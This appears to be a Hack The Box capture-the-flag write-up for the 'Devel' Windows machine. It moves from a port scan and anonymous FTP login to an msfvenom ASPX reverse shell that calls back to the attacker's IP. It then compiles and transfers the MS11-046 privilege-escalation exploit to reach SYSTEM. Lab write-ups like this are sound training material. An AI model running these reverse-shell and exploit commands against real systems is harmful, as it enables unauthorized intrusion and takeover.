---
description: File tranfering from linux to windows...
---

# Devel

### Set environment variables

export ip="10.10.10.5"&#x20;

export box="devel.htb"

### Recon

\*\* Network Scanner \*\*

```
rustscan -a $ip --ulimit 6500 --batch-size 3000 -r 1-65534 -- -sC -sV -oN $ip.nmap

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Analysing the output of the network scan, it's noticed that service is vunlerable to login with anonymous users. So, with this following credentials the login on it service are allowed:

```
anonymous
anonymous@domain.com
```

putting a revese shell into the target fpt server

Generating the reverse shell:

```
msfvenom -p windows/reverse_tcp LHOST=10.10.14.46 LPORT=1337 -f aspx -o shell.aspx
```

On metasploit:

```
use exploit/multi/handler

set lhost local_ip
set lport local_port
```

Hit the uploaded shell

```
curl $ip/shell.aspx
```

### Privilage escalation

After got a shell and try catch the flags from user and root, another recon is initialized searching for security gaps that allow an privilage escalation.

for that reason, the command _systeminfo_ was runned to get informations from system

```
10.10.10.5
Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31
System Boot Time:          8/7/2022, 10:31:25
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.328 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.393 MB
Virtual Memory: In Use:    748 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::e435:c065:b48:61d
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

Analyzing the informations gathered, the hotfix field was signed with "N/A", that means any patch of security was applyed, considering it and the system version "6.1.7600".

Searching for exploit for this windows version, the first one is: \*\* MS11-046 \*\* With it's id on exploitdb(40564), we go the source code of the exploit.

```
seachexploit -x 40564 > exploit.c
```

Now is necessary compile the exploit.

```
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

And following transfer the exploit to target machine

* kali: Up smbserver \*

```
usr/share/doc/python3-impacket/examples/smbserver.py shared .
```

* Devel machine: Get file \*

```
copy \\10.10.14.46\shared\exploit.exe
```

Aftter execute the exploit with:

```
exploit.exe
```

If all thing are done rigth, it will possible access content as Administrator

```
whoami
nt authority\system
```
